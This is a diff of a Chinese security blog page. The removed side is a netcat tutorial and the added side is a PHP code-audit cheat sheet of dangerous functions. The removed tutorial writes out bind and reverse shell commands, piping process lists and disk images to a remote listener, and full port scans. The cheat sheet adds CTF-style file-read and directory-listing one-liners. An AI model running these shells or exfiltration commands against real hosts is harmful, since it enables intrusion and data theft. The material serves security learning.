@@ -112,19 +112,17 @@
 
 
 
-  <meta name="description" content="Netcat(nc):NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。 Nc可以在两台设备上面相互交互，即侦听模式/传输模式  Telnet功能 获取banner信息 传输文本信息 传输文件/目录 加密传输文件，默认不加密 远程控制 加密所有流量 流媒体服务器 远程克隆硬盘  常用参数： -n 以数字形式表示的IP地址 -v 显示详细信息 [使用=vv获取更详细的信息 -l">
+  <meta name="description" content="php代码执行 eval() assert() preg_replace + ‘/e’ call_user_func() call_user_func_array() create_function array_map()  系统命令执行 system() passthru() exec() pcntl_exec() shell_exec() popen() proc_open() `(反单引号)">
 <meta property="og:type" content="article">
-<meta property="og:title" content="nc命令使用">
-<meta property="og:url" content="http://yoursite.com/2018/12/04/nc命令使用/index.html">
+<meta property="og:title" content="PHP代码审计">
+<meta property="og:url" content="http://yoursite.com/2018/12/20/PHP代码审计/index.html">
 <meta property="og:site_name" content="guolala&#39;s blog">
-<meta property="og:description" content="Netcat(nc):NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。 Nc可以在两台设备上面相互交互，即侦听模式/传输模式  Telnet功能 获取banner信息 传输文本信息 传输文件/目录 加密传输文件，默认不加密 远程控制 加密所有流量 流媒体服务器 远程克隆硬盘  常用参数： -n 以数字形式表示的IP地址 -v 显示详细信息 [使用=vv获取更详细的信息 -l">
+<meta property="og:description" content="php代码执行 eval() assert() preg_replace + ‘/e’ call_user_func() call_user_func_array() create_function array_map()  系统命令执行 system() passthru() exec() pcntl_exec() shell_exec() popen() proc_open() `(反单引号)">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv4a6vt6pj30kn0hc406.jpg">
-<meta property="og:updated_time" content="2018-12-04T15:12:54.197Z">
+<meta property="og:updated_time" content="2018-12-20T15:26:13.586Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="nc命令使用">
-<meta name="twitter:description" content="Netcat(nc):NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。 Nc可以在两台设备上面相互交互，即侦听模式/传输模式  Telnet功能 获取banner信息 传输文本信息 传输文件/目录 加密传输文件，默认不加密 远程控制 加密所有流量 流媒体服务器 远程克隆硬盘  常用参数： -n 以数字形式表示的IP地址 -v 显示详细信息 [使用=vv获取更详细的信息 -l">
-<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv4a6vt6pj30kn0hc406.jpg">
+<meta name="twitter:title" content="PHP代码审计">
+<meta name="twitter:description" content="php代码执行 eval() assert() preg_replace + ‘/e’ call_user_func() call_user_func_array() create_function array_map()  系统命令执行 system() passthru() exec() pcntl_exec() shell_exec() popen() proc_open() `(反单引号)">
 
 
 
@@ -133,7 +131,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/12/04/nc命令使用/">
+  <link rel="canonical" href="http://yoursite.com/2018/12/20/PHP代码审计/">
 
 
 
@@ -143,7 +141,7 @@
   };
 </script>
 
-  <title>nc命令使用 | guolala's blog</title>
+  <title>PHP代码审计 | guolala's blog</title>
   
 
 
@@ -356,7 +354,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/04/nc命令使用/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/20/PHP代码审计/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="guolala">
@@ -373,7 +371,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">nc命令使用
+          <h1 class="post-title" itemprop="name headline">PHP代码审计
               
             
           </h1>
@@ -398,7 +396,7 @@
                 
               
 
-              <time title="创建时间：2018-12-04 23:07:24 / 修改时间：23:12:54" itemprop="dateCreated datePublished" datetime="2018-12-04T23:07:24+08:00">2018-12-04</time>
+              <time title="创建时间：2018-12-20 23:17:03 / 修改时间：23:26:13" itemprop="dateCreated datePublished" datetime="2018-12-20T23:17:03+08:00">2018-12-20</time>
             
 
             
@@ -420,7 +418,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/命令使用/" itemprop="url" rel="index"><span itemprop="name">命令使用</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a></span>
 
                 
                 
@@ -461,76 +459,84 @@
       
 
       
-        <h1 id="Netcat-nc"><a href="#Netcat-nc" class="headerlink" title="Netcat(nc):"></a>Netcat(nc):</h1><p>NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。</p>
-<p>Nc可以在两台设备上面相互交互，即侦听模式/传输模式</p>
-<ul>
-<li>Telnet功能</li>
-<li>获取banner信息</li>
-<li>传输文本信息</li>
-<li>传输文件/目录</li>
-<li>加密传输文件，默认不加密</li>
-<li>远程控制</li>
-<li>加密所有流量</li>
-<li>流媒体服务器</li>
-<li>远程克隆硬盘</li>
+        <h1 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行"></a>php代码执行</h1><ul>
+<li>eval()</li>
+<li>assert()</li>
+<li>preg_replace + ‘/e’</li>
+<li>call_user_func()</li>
+<li>call_user_func_array()</li>
+<li>create_function</li>
+<li>array_map()</li>
 </ul>
-<h2 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h2><ul>
-<li>-n 以数字形式表示的IP地址</li>
-<li>-v 显示详细信息 [使用=vv获取更详细的信息</li>
-<li>-l 监听入站信息</li>
-<li>-p port 本地端口</li>
-<li>-q secs 在标准输入且延迟后退出</li>
-<li>-c shell commands shell模式</li>
-<li>-u UDP模式</li>
-<li>-s addr 本地源地址</li>
-<li>-h 获取帮助信息</li>
-<li>-z I/O 模式 [扫描时使用]</li>
+<h1 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h1><ul>
+<li>system()</li>
+<li>passthru()</li>
+<li>exec()</li>
+<li>pcntl_exec()</li>
+<li>shell_exec()</li>
+<li>popen()</li>
+<li>proc_open()</li>
+<li>`(反单引号)</li>
+<li>ob_start()</li>
+<li>escapeshellcmd() // 该函数用于过滤</li>
 </ul>
-<h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><pre><code>A:nc -lp port -c bash
-B:nc ip port
-</code></pre><p>A将自己的Bash发给B</p>
-<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><pre><code>A:nc -lp port
-B:nc ip port -c bash
-</code></pre><p>B将自己的Bash发给A</p>
-<blockquote>
-<p>win下Bash换成cmd</p>
-</blockquote>
-<p>通常反向连接 比较常用，因为防火墙的存在，让目标机主动发送shell</p>
-<h2 id="使用NC进行信息收集"><a href="#使用NC进行信息收集" class="headerlink" title="使用NC进行信息收集"></a>使用NC进行信息收集</h2><h3 id="简单的建立连接，就是侦听模式和传输模式"><a href="#简单的建立连接，就是侦听模式和传输模式" class="headerlink" title="简单的建立连接，就是侦听模式和传输模式"></a>简单的建立连接，就是侦听模式和传输模式</h3><ul>
-<li>nc -lp port  监听指定端口号</li>
-<li>nc -nv ip port  连接对方tcp端口，默认情况下，双方可以发送文本信息</li>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><ul>
+<li><code>move_uploaded_file()</code></li>
+<li>getimagesize() //验证文件头只要为GIF89a，就会返回真</li>
 </ul>
-<h3 id="收集目标机上的进程信息"><a href="#收集目标机上的进程信息" class="headerlink" title="收集目标机上的进程信息"></a>收集目标机上的进程信息</h3><ul>
-<li>nc -l -p 4444 &gt;wing.txt 将远程发送过来的内容保存在本地</li>
-<li>Ps aux |nc -nv ip port -q 1  标准输入完成后delay一秒钟，会发送到侦听端</li>
+<h1 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h1><ul>
+<li>unlink()</li>
+<li>session_destroy()</li>
 </ul>
-<h2 id="NC传输文件-目录"><a href="#NC传输文件-目录" class="headerlink" title="NC传输文件/目录"></a>NC传输文件/目录</h2><ul>
-<li>nc -lp 4444 &gt;1.txt 1.txt就是你要保存的文件名 自定义</li>
-<li>nc -nv ip port &lt;1.txt -q 1 将文件发送给侦听端<blockquote>
-<p>侦听端的文件名最好按照文件本身来命名</p>
-</blockquote>
-</li>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ul>
+<li>require()</li>
+<li>include()</li>
+<li>include_once()</li>
+<li>require_once()</li>
 </ul>
-<p><strong>将目录打包：</strong></p>
-<p>tar -cvf - 目录名/|nc -lp port -q 1</p>
-<p><strong>将目录解包</strong></p>
-<p>nc -nv ip port |tar -xvf -</p>
-<p><strong>NC端口扫描</strong></p>
-<p>nc -nvz ip 1-65535</p>
-<h2 id="NC文件加密传输"><a href="#NC文件加密传输" class="headerlink" title="NC文件加密传输"></a>NC文件加密传输</h2><pre><code>apt-get install mcrypt
-A： nc -lp port|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb &gt;文件名
-B：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt;文件名|nc -nv ip port -q 1
-</code></pre><p>B将文件加密发送，A接受后先解密再保存到本地，B在1s后退出。<br>主要是利用mcrypt进行加密</p>
-<h2 id="NC端口扫描"><a href="#NC端口扫描" class="headerlink" title="NC端口扫描"></a>NC端口扫描</h2><p>nc -nvz ip 1-65535</p>
-<p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv4a6vt6pj30kn0hc406.jpg" alt=""></p>
-<p>默认使用tcp进行扫描</p>
-<h2 id="NC复制磁盘"><a href="#NC复制磁盘" class="headerlink" title="NC复制磁盘"></a>NC复制磁盘</h2><pre><code>A:nc -lp port |dd of=/dev/sda
-B: dd if=/dev/sda | nc -nc ip port -q 1
-</code></pre><ul>
-<li>If是input filter</li>
-<li>Of 是output filter</li>
+<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><ul>
+<li>allow_url_include = on</li>
 </ul>
-<p>B将数据复制到A挂载的硬盘上</p>
+<h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><ul>
+<li>hightlight_file($filename);</li>
+<li>show_source($filename);</li>
+<li>print_r(php_strip_whitespace($filename));</li>
+<li>print_r(file_get_contents($filename));</li>
+<li>readfile($filename);</li>
+<li>print_r(file($filename)); // var_dump</li>
+<li>fread(fopen(size);</li>
+<li>include($filename); // 非php代码</li>
+<li>include_once($filename); // 非php代码</li>
+<li>require($filename); // 非php代码</li>
+<li>require_once($filename); // 非php代码</li>
+<li>print_r(fread(popen(“cat flag”, “r”), $size));</li>
+<li>print_r(fgets(fopen($filename, “r”))); // 读取一行</li>
+<li>fpassthru(fopen($filename, “r”)); // 从当前位置一直读取到 EOF</li>
+<li>print_r(fgetcsv(fopen(size));</li>
+<li>print_r(fgetss(fopen($filename, “r”))); // 从文件指针中读取一行并过滤掉 HTML 标记</li>
+<li>print_r(fscanf(fopen(“flag”, “r”),”%s”));</li>
+<li>print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</li>
+</ul>
+<h1 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h1><ul>
+<li>print_r(glob(“*”)); // 列当前目录</li>
+<li>print_r(glob(“/*”)); // 列根目录 print_r(scandir(“.”));</li>
+<li>print_r(scandir(“/“));<br>  $d=opendir(“.”);while(false!==($f=readdir($d))){echo”$f\n”;}<br>  $d=dir(“.”);while(false!==($f=$d-&gt;read())){echo$f.”\n”;}</li>
+</ul>
+<h1 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h1><ul>
+<li>$GLOBALS</li>
+</ul>
+<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul>
+<li>extract()</li>
+<li><code>import_request_variables()</code></li>
+<li>parse_str()</li>
+<li><code>mb_parse_str()</code></li>
+<li>全局变量覆盖：<code>register_globals</code>为ON，$GLOBALS</li>
+</ul>
+<h1 id="php序列化函数"><a href="#php序列化函数" class="headerlink" title="php序列化函数"></a>php序列化函数</h1><ul>
+<li>serialize()</li>
+<li>unserialize()</li>
+<li>ini_set(‘session.serialize_handler’, ‘php_serialize’);</li>
+</ul>
 
       
     </div>
@@ -561,8 +567,8 @@ B: dd if=/dev/sda | nc -nc ip port -q 1
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/04/常见的漏洞端口/" rel="next" title="常见的漏洞端口">
-                <i class="fa fa-chevron-left"></i> 常见的漏洞端口
+              <a href="/2018/12/18/跨域资源共享CORS详解/" rel="next" title="跨域资源共享CORS详解">
+                <i class="fa fa-chevron-left"></i> 跨域资源共享CORS详解
               </a>
             
           </div>
@@ -570,10 +576,6 @@ B: dd if=/dev/sda | nc -nc ip port -q 1
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/12/05/密码提取神器-mimikatz/" rel="prev" title="密码提取神器--mimikatz">
-                密码提取神器--mimikatz <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -759,7 +761,7 @@ B: dd if=/dev/sda | nc -nc ip port -q 1
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Netcat-nc"><span class="nav-number">1.</span> <span class="nav-text">Netcat(nc):</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#常用参数："><span class="nav-number">1.1.</span> <span class="nav-text">常用参数：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实例："><span class="nav-number">1.2.</span> <span class="nav-text">实例：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#正向连接"><span class="nav-number">1.2.1.</span> <span class="nav-text">正向连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反向连接"><span class="nav-number">1.2.2.</span> <span class="nav-text">反向连接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用NC进行信息收集"><span class="nav-number">1.3.</span> <span class="nav-text">使用NC进行信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简单的建立连接，就是侦听模式和传输模式"><span class="nav-number">1.3.1.</span> <span class="nav-text">简单的建立连接，就是侦听模式和传输模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#收集目标机上的进程信息"><span class="nav-number">1.3.2.</span> <span class="nav-text">收集目标机上的进程信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NC传输文件-目录"><span class="nav-number">1.4.</span> <span class="nav-text">NC传输文件/目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NC文件加密传输"><span class="nav-number">1.5.</span> <span class="nav-text">NC文件加密传输</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NC端口扫描"><span class="nav-number">1.6.</span> <span class="nav-text">NC端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NC复制磁盘"><span class="nav-number">1.7.</span> <span class="nav-text">NC复制磁盘</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php代码执行"><span class="nav-number">1.</span> <span class="nav-text">php代码执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#系统命令执行"><span class="nav-number">2.</span> <span class="nav-text">系统命令执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传"><span class="nav-number">3.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件删除"><span class="nav-number">4.</span> <span class="nav-text">文件删除</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件包含"><span class="nav-number">5.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#本地文件包含"><span class="nav-number">5.1.</span> <span class="nav-text">本地文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程文件包含"><span class="nav-number">5.2.</span> <span class="nav-text">远程文件包含</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件读取"><span class="nav-number">6.</span> <span class="nav-text">文件读取</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#列目录"><span class="nav-number">7.</span> <span class="nav-text">列目录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#超全局变量"><span class="nav-number">8.</span> <span class="nav-text">超全局变量</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#变量覆盖"><span class="nav-number">9.</span> <span class="nav-text">变量覆盖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php序列化函数"><span class="nav-number">10.</span> <span class="nav-text">php序列化函数</span></a></li></ol></div>
             
 
           </div>
